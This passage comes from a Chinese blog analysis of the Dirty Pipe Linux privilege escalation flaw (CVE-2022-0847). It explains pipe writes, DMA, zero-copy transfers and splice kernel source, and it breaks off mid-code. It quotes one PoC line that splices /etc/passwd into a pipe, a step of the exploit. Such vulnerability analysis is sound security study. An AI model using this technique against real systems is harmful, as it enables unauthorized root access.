   <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 如果我们做一个唤醒事件，我们做一个“同步”唤醒，因为我们希望阅读器尽快开始处理事情，而不是让数据处于未决状态。</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * 这对于小型写入尤其重要，因为（例如）GNU make jobserver 如何使用小型写入来唤醒挂起的作业</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">if</span> (was_empty) &#123;</span><br><span class="line">		<span class="built_in">wake_up_interruptible_sync_poll</span>(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">		<span class="built_in">kill_fasync</span>(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (wake_next_writer)</span><br><span class="line">		<span class="built_in">wake_up_interruptible_sync_poll</span>(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">	<span class="keyword">if</span> (ret &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">sb_start_write_trylock</span>(<span class="built_in">file_inode</span>(filp)-&gt;i_sb)) &#123;</span><br><span class="line">		<span class="keyword">int</span> err = <span class="built_in">file_update_time</span>(filp);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			ret = err;</span><br><span class="line">		<span class="built_in">sb_end_write</span>(<span class="built_in">file_inode</span>(filp)-&gt;i_sb);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>0.12内核代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_pipe</span><span class="params">(struct m_inode * inode, <span class="keyword">char</span> * buf, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> chars, size, written = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">while</span> (!(size=(PAGE_SIZE<span class="number">-1</span>)-<span class="built_in">PIPE_SIZE</span>(*inode))) &#123;</span><br><span class="line">			<span class="built_in">wake_up</span>(&amp; <span class="built_in">PIPE_READ_WAIT</span>(*inode));</span><br><span class="line">			<span class="keyword">if</span> (inode-&gt;i_count != <span class="number">2</span>) &#123; <span class="comment">/* no readers */</span></span><br><span class="line">				current-&gt;signal |= (<span class="number">1</span>&lt;&lt;(SIGPIPE<span class="number">-1</span>));</span><br><span class="line">				<span class="keyword">return</span> written?written:<span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">sleep_on</span>(&amp; <span class="built_in">PIPE_WRITE_WAIT</span>(*inode));</span><br><span class="line">		&#125;</span><br><span class="line">		chars = PAGE_SIZE-<span class="built_in">PIPE_HEAD</span>(*inode);</span><br><span class="line">		<span class="keyword">if</span> (chars &gt; count)</span><br><span class="line">			chars = count;</span><br><span class="line">		<span class="keyword">if</span> (chars &gt; size)</span><br><span class="line">			chars = size;</span><br><span class="line">		count -= chars;</span><br><span class="line">		written += chars;</span><br><span class="line">		size = <span class="built_in">PIPE_HEAD</span>(*inode);</span><br><span class="line">		<span class="built_in">PIPE_HEAD</span>(*inode) += chars;</span><br><span class="line">		<span class="built_in">PIPE_HEAD</span>(*inode) &amp;= (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">		<span class="keyword">while</span> (chars--&gt;<span class="number">0</span>)</span><br><span class="line">			((<span class="keyword">char</span> *)inode-&gt;i_size)[size++]=<span class="built_in">get_fs_byte</span>(buf++);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">wake_up</span>(&amp; <span class="built_in">PIPE_READ_WAIT</span>(*inode));</span><br><span class="line">	<span class="keyword">return</span> written;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="四、DMA-copy"><a href="#四、DMA-copy" class="headerlink" title="四、DMA copy"></a>四、DMA copy</h3><p>一般DMA copy都会拿来与CPU copy做比较，所以我们将二者放在一起讨论。</p>
<p>在没有 DMA 技术前，I/O 的过程是这样的：</p>
<ul>
<li>CPU 发出对应的指令给磁盘控制器，然后返回；</li>
<li>磁盘控制器收到指令后，于是就开始准备数据，会把数据放入到磁盘控制器的内部缓冲区中，然后产生一个<strong>中断</strong>；</li>
<li>CPU 收到中断信号后，停下手头的工作，接着把磁盘控制器的缓冲区的数据一次一个字节地读进自己的寄存器，然后再把寄存器里的数据写入到内存，而在数据传输的期间 CPU 是无法执行其他任务的。</li>
</ul>
<p>流程图如下</p>
<p>![I_O 中断](I_O 中断.png)</p>
<p>可以看到，整个数据的传输过程，都要需要 CPU 亲自参与搬运数据的过程，而且这个过程，CPU 是不能做其他事情的。当数据过多时将会对操作系统造成负担，也会降低系统的吞吐量。</p>
<p>一个朴素的想法就是，当某个设备想要访问一块内存时就直接进行访问，不需要CPU进行参与，而DMA也是这么做的。</p>
<p>DMA（Direct Memory Access）：顾名思义为直接内存访问，如果没有 DMA，当 CPU 使用<a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Programmed_input/output" >编程输入/输出<i class="fas fa-external-link-alt"></i></a>时通常会在整个读取或写入操作期间被完全占用，因此无法执行其他工作。对于 DMA，CPU 首先启动传输，然后在传输过程中执行其他操作，最后在操作完成时从 DMA 控制器 (DMAC)接收中断。许多硬件系统都使用 DMA，包括磁盘驱动器控制器、显卡、网卡和声卡等等。类似地，多核处理器内的处理元件可以在不占用其处理器时间的情况下将数据传入和传出其本地内存，从而允许计算和数据传输并行进行。</p>
<p>流程如下</p>
<p>![DRM I_O 过程](DRM I_O 过程.png)</p>
<p>虽然DMA很方便，但是DMA会带来缓存一致性的问题。什么是缓存一致性呢？当DMA与CPU均可以访问到缓存时，如果CPU对内存进行了修改，但是仅仅写在了缓存中还没同步进内存，此时硬件访问了内存，这时可能读到的是旧的值。这就是缓存一致性的问题。</p>
<p>这些问题可以用两种方法来解决：</p>
<ol>
<li>缓存同调系统（Cache-coherent system）：以硬件方法来完成，当外部设备写入内存时以一个信号来通知缓存控制器某内存地址的值已经过期或是应该更新资料。</li>
<li>非同调系统（Non-coherent system）：以软件方法来完成，操作系统必须确保在开始传出 DMA 传输之前刷新缓存行，并在访问受传入 DMA 传输影响的内存范围之前使其无效。</li>
</ol>
<p>第二种的方法会造成DMA的系统负担。</p>
<p>但总体来说，DMA的出现，大大提高了系统的吞吐量。</p>
<h3 id="五、零拷贝"><a href="#五、零拷贝" class="headerlink" title="五、零拷贝"></a>五、零拷贝</h3><p>这部分内容网上已经有很多不错的文章了，分析的也比较透彻，这里简单描述下相关的原理。</p>
<h4 id="1、传统的文件传输"><a href="#1、传统的文件传输" class="headerlink" title="1、传统的文件传输"></a>1、传统的文件传输</h4><p>如果服务端要提供文件传输的功能，我们能想到的最简单的方式是：将磁盘上的文件读取出来，然后通过网络协议发送给客户端。</p>
<p>传统 I/O 的工作方式是，数据读取和写入是从用户空间到内核空间来回复制，而内核空间的数据是通过操作系统层面的 I/O 接口从磁盘读取或写入。</p>
<p>代码通常如下，一般会需要两个系统调用：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(file, tmp_buf, len);</span><br><span class="line"><span class="built_in">write</span>(socket, tmp_buf, len);</span><br></pre></td></tr></table></figure>

<p>代码很简单，虽然就两行代码，但是这里面发生了不少的事情。</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BC%A0%E7%BB%9F%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93.png" alt="传统文件传输"></p>
<p>首先发生了四次ring0和ring3的上下文切换（两次系统调用，每次系统调用都是先从ring3到ring0，ring0得到结果时再将结果返回给ring3）。而上下文切换到成本并不小，一次切换需要耗时几十纳秒到几微秒，虽然时间看上去很短，但是在高并发的场景下，这类时间容易被累积和放大，从而影响系统的性能。</p>
<p>其次，还<strong>发生了 4 次数据拷贝</strong>，其中两次是 DMA 的拷贝，另外两次则是通过 CPU 拷贝的，下面说一下这个过程：</p>
<ul>
<li><em>第一次拷贝</em>，把磁盘上的数据拷贝到操作系统内核的缓冲区里，这个拷贝的过程是通过 DMA 搬运的。</li>
<li><em>第二次拷贝</em>，把内核缓冲区的数据拷贝到用户的缓冲区里，于是我们应用程序就可以使用这部分数据了，这个拷贝到过程是由 CPU 完成的。</li>
<li><em>第三次拷贝</em>，把刚才拷贝到用户的缓冲区里的数据，再拷贝到内核的 socket 的缓冲区里，这个过程依然还是由 CPU 搬运的。</li>
<li><em>第四次拷贝</em>，把内核的 socket 缓冲区里的数据，拷贝到网卡的缓冲区里，这个过程又是由 DMA 搬运的。</li>
</ul>
<p>这种简单又传统的文件传输方式，存在冗余的上文切换和数据拷贝，在高并发系统里是非常糟糕的，多了很多不必要的开销，会严重影响系统性能。</p>
<p>所以，<strong>要想提高文件传输的性能，就需要减少「用户态与内核态的上下文切换」和「内存拷贝」的次数</strong>。</p>
<h4 id="2、mmap-write"><a href="#2、mmap-write" class="headerlink" title="2、mmap + write"></a>2、mmap + write</h4><p>在前面我们知道，<code>read()</code> 系统调用的过程中会把内核缓冲区的数据拷贝到用户的缓冲区里，于是为了减少这一步开销，我们可以用 <code>mmap()</code> 替换 <code>read()</code> 系统调用函数。                                               </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">mmap</span>(file, len);</span><br><span class="line"><span class="built_in">write</span>(sockfd, buf, len);</span><br></pre></td></tr></table></figure>

<p><code>mmap()</code> 系统调用函数会直接把内核缓冲区里的数据「<strong>映射</strong>」到用户空间，这样，操作系统内核与用户空间就不需要再进行任何的数据拷贝操作。</p>
<p>![mmap + write 零拷贝](mmap + write 零拷贝.png)</p>
<p>具体过程如下：</p>
<ul>
<li>应用进程调用了 <code>mmap()</code> 后，DMA 会把磁盘的数据拷贝到内核的缓冲区里。接着，应用进程跟操作系统内核「共享」这个缓冲区；</li>
<li>应用进程再调用 <code>write()</code>，操作系统直接将内核缓冲区的数据拷贝到 socket 缓冲区中，这一切都发生在内核态，由 CPU 来搬运数据；</li>
<li>最后，把内核的 socket 缓冲区里的数据，拷贝到网卡的缓冲区里，这个过程是由 DMA 搬运的。</li>
</ul>
<p>我们可以得知，通过使用 <code>mmap()</code> 来代替 <code>read()</code>， 可以减少一次数据拷贝的过程。也就是说，使用mmap + write进行文件传输会进行四次上下文切换以及三次数据拷贝。</p>
<p>但这还不是最理想的零拷贝，因为仍然需要通过 CPU 把内核缓冲区的数据拷贝到 socket 缓冲区里，而且仍然需要 4 次上下文切换，因为系统调用还是 2 次。</p>
<h4 id="3、sendfile"><a href="#3、sendfile" class="headerlink" title="3、sendfile"></a>3、sendfile</h4><p>在 Linux 内核版本 2.1 中，提供了一个专门发送文件的系统调用函数 <code>sendfile()</code>，函数形式如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendfile</span><span class="params">(<span class="keyword">int</span> out_fd, <span class="keyword">int</span> in_fd, <span class="keyword">off_t</span> *offset, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure>

<p>它的前两个参数分别是目的端和源端的文件描述符，后面两个参数是源端的偏移量和复制数据的长度，返回值是实际复制数据的长度。</p>
<p>首先，它可以替代前面的 <code>read()</code> 和 <code>write()</code> 这两个系统调用，这样就可以减少一次系统调用，也就减少了 2 次上下文切换的开销。</p>
<p>其次，该系统调用，可以直接把内核缓冲区里的数据拷贝到 socket 缓冲区里，不再拷贝到用户态，这样就只有 2 次上下文切换，和 3 次数据拷贝。如下图：</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/senfile-3%E6%AC%A1%E6%8B%B7%E8%B4%9D.png" alt="senfile-3次拷贝"></p>
<p>在linux2.4版本，对于支持网卡支持 SG-DMA 技术的情况下， <code>sendfile()</code> 系统调用的过程发生了点变化，具体过程如下：</p>
<ul>
<li>第一步，通过 DMA 将磁盘上的数据拷贝到内核缓冲区里；</li>
<li>第二步，缓冲区描述符和数据长度传到 socket 缓冲区，这样网卡的 SG-DMA 控制器就可以直接将内核缓存中的数据拷贝到网卡的缓冲区里，此过程不需要将数据从操作系统内核缓冲区拷贝到 socket 缓冲区中，这样就减少了一次数据拷贝；</li>
</ul>
<p>所以，这个过程之中，只进行了 2 次数据拷贝，如下图：</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/senfile-%E9%9B%B6%E6%8B%B7%E8%B4%9D.png" alt="senfile-零拷贝"></p>
<p>在 2.6.33 之前的 Linux 内核中，out_fd必须引用一个套接字。从 Linux 2.6.33 开始，它可以是任何文件。如果是普通文件，然后sendfile () 适当地更改文件偏移量。</p>
<p>sendfile有个问题是它的in_fd不能是套接字，只能是文件，所以应用场景上是有限制的。</p>
<p>实现思路跟 splice是一样的，也需要使用pipe来做中介，但他这个<a class="link"   target="_blank" rel="noopener" href="http://lxr.linux.no/linux+v3.5.4/+code=do_splice_direct" >do_splice_direct<i class="fas fa-external-link-alt"></i></a> 使用一个每个进程缓存（在 corrent指针的 splice_pipe）的一个pipe，可以少用一次系统调用（正常的splice需要从 文件到 pipe，然后再从pipe到socket，有两次调用）。</p>
<h4 id="4、splice"><a href="#4、splice" class="headerlink" title="4、splice"></a>4、splice</h4><p><code>splice</code>与<code>sendfile</code>类似，不过<code>splice</code>的<code>in_fd</code>并不限定是文件，也可以是套接字，这使它更通用一些.。</p>
<p>但是正常如果想要实现从<code>socket</code>到<code>socket</code>的传输的话需要两次系统调用，上面在<code>sendfile</code>中也提到过，</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 省略了部分参数</span><br><span class="line"><span class="built_in">splice</span> (socket1_fd，  pipe_fd</span><br><span class="line">splice （pipl_fd, socket2_fd</span><br></pre></td></tr></table></figure>

<p>也就是说，<code>splice</code>的系统上下文切换次数是4次，数据拷贝次数是两次，。</p>
<h4 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h4><p>上面提到<code>sendfile</code>的时候也了解到，<code>sendfile</code>的上下文切换次数与数据拷贝次数均为两次，而splice因为要进行两次系统调用，所以上下文切换次数比<code>sendfile</code>要多两侧，所以在<code>文件-&gt;other</code>的场景下，<code>sendfile</code>的性能是要优于<code>splice</code>的，而如果<code>sendfile</code>用不了，那么<code>splice</code>一般情况下是更好的选择。</p>
<h3 id="六、splice-系统调用源代码实现"><a href="#六、splice-系统调用源代码实现" class="headerlink" title="六、splice 系统调用源代码实现"></a>六、splice 系统调用源代码实现</h3><h4 id="0、前言-1"><a href="#0、前言-1" class="headerlink" title="0、前言"></a>0、前言</h4><p>实际上splice利用的就是零拷贝技术。首先明确一点，如果要提供性能，一是减少系统调用，二是减少ring0和ring3间内存拷贝。常规的文件拷贝技术使用的时read和write，并需要一块临时缓冲区，这样既增加了系统调用，又需要ring0和ring3之间的内存拷贝，而splice很好的解决了这个问题，他的内存拷贝只有两个必要的DMA copy，而需要的临时缓冲区是使用管道实现的，优点就是只需要传递指针即可让两个文件都可以访问得到。具体各个拷贝方案的对比<a class="link"   target="_blank" rel="noopener" href="https://juejin.cn/post/6995519558475841550" >参见<i class="fas fa-external-link-alt"></i></a>。</p>
<p>代码有一部分的变量值是我通过poc实时得出的，并不适用于所有情况。其目的在于了解函数的大体流程。</p>
<p>poc中调用splice的代码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> nbytes = <span class="built_in">splice</span>(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>这里的<code>fd</code>是 <code>/etc/passwd</code>的文件描述符，<code>p[1]</code>为写管道的文件描述符。代码逻辑为将<code>/etc/passwd</code>中偏移以<code>offset</code>为偏移的内容取一字节放入管道中。这里的<code>offset</code>为<code>0x3</code>。</p>
<p>代码追踪可以从</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.11.1/source/fs/splice.c#L1325" >https://elixir.bootlin.com/linux/v5.11.1/source/fs/splice.c#L1325<i class="fas fa-external-link-alt"></i></a></p>
<p>开始。</p>
<p>照例这里先将整体的流程图贴出来，方便师傅们对函数调用流程有个整体的把握。</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220328104549539.png" alt="image-20220328104549539"></p>
<h4 id="1、splice"><a href="#1、splice" class="headerlink" title="1、splice"></a>1、splice</h4><p>调用了<code>__do_splice</code>函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SYSCALL_DEFINE6</span>(splice, <span class="keyword">int</span>, fd_in, <span class="keyword">loff_t</span> __user *, off_in,</span><br><span class="line">		<span class="keyword">int</span>, fd_out, <span class="keyword">loff_t</span> __user *, off_out,</span><br><span class="line">		<span class="keyword">size_t</span>, len, <span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">in</span>, <span class="title">out</span>;</span></span><br><span class="line">	<span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(!len))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(flags &amp; ~SPLICE_F_ALL))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	error = -EBADF;</span><br><span class="line">	in = <span class="built_in">fdget</span>(fd_in);</span><br><span class="line">	<span class="keyword">if</span> (in.file) &#123;</span><br><span class="line">		out = <span class="built_in">fdget</span>(fd_out);</span><br><span class="line">		<span class="keyword">if</span> (out.file) &#123;</span><br><span class="line">			error = __do_splice(in.file, off_in, out.file, off_out,</span><br><span class="line">						len, flags);				<span class="comment">// 跟进</span></span><br><span class="line">			<span class="built_in">fdput</span>(out);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fdput</span>(in);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2、-do-splice"><a href="#2、-do-splice" class="headerlink" title="2、__do_splice"></a>2、__do_splice</h4><p>定义了<code>pipe_inode_info</code>类型的<code>ipipe</code>与<code>opipe</code>，之后调用<code>get_pipe_info</code>从传入的<code>file</code>结构体实例中获得<code>pipe</code>实例，然后调用<code>do_splice</code>函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> __do_splice(struct file *in, <span class="keyword">loff_t</span> __user *off_in,</span><br><span class="line">			struct file *out, <span class="keyword">loff_t</span> __user *off_out,</span><br><span class="line">			<span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">ipipe</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">opipe</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span> offset, *__off_in = <span class="literal">NULL</span>, *__off_out = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">	ipipe = <span class="built_in">get_pipe_info</span>(in, <span class="literal">true</span>);				<span class="comment">// 取 file-&gt;private_data值，这里为0x0</span></span><br><span class="line">	opipe = <span class="built_in">get_pipe_info</span>(out, <span class="literal">true</span>);			<span class="comment">// 这里是指向管道的指针，不明白这里的代码有什么作用，这里取到了ipipe和opipe只是做了下校验，后面do_splice也调用了get_pipe_info函数，不如将其放到后面进行校验，少了一次函数调用。</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ipipe &amp;&amp; off_in)</span><br><span class="line">		<span class="keyword">return</span> -ESPIPE;</span><br><span class="line">	<span class="keyword">if</span> (opipe &amp;&amp; off_out)</span><br><span class="line">		<span class="keyword">return</span> -ESPIPE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (off_out) &#123;			<span class="comment">// 为0</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">copy_from_user</span>(&amp;offset, off_out, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">loff_t</span>)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		__off_out = &amp;offset;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (off_in) &#123;			<span class="comment">// 指向loff_t结构体的指针</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">copy_from_user</span>(&amp;offset, off_in, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">loff_t</span>)))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		__off_in = &amp;offset;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = <span class="built_in">do_splice</span>(in, __off_in, out, __off_out, len, flags);		<span class="comment">// 跟进</span></span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (__off_out &amp;&amp; <span class="built_in">copy_to_user</span>(off_out, __off_out, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">loff_t</span>)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (__off_in &amp;&amp; <span class="built_in">copy_to_user</span>(off_in, __off_in, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">loff_t</span>)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3、do-splice"><a href="#3、do-splice" class="headerlink" title="3、do_splice"></a>3、do_splice</h4><p>这里对数据进行了进一步处理，判断了<code>in</code>，<code>off_in</code>，<code>out</code>，<code>off_out</code></p>
<p>这里分三种情况，<code>in</code>和<code>out</code>都有<code>pipe</code>时，调用<code>splice_pipe_to_pipe</code>；<code>in</code>为<code>pipe</code>时调用<code>do_splice_from</code>，<code>out</code>为<code>pipe</code>时调用<code>do_splice_to</code>。这俩单个的也涉及<code>offset</code>的用户空间和内核空间复制的问题。</p>
<p>由于我们poc中的<code>splice</code>系统调用是从文件写入管道，所以我们在实时调试中调用的是<code>do_splice_to</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine where to splice to/from.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">do_splice</span><span class="params">(struct file *in, <span class="keyword">loff_t</span> *off_in, struct file *out,</span></span></span><br><span class="line"><span class="params"><span class="function">	       <span class="keyword">loff_t</span> *off_out, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">ipipe</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">opipe</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span> offset;</span><br><span 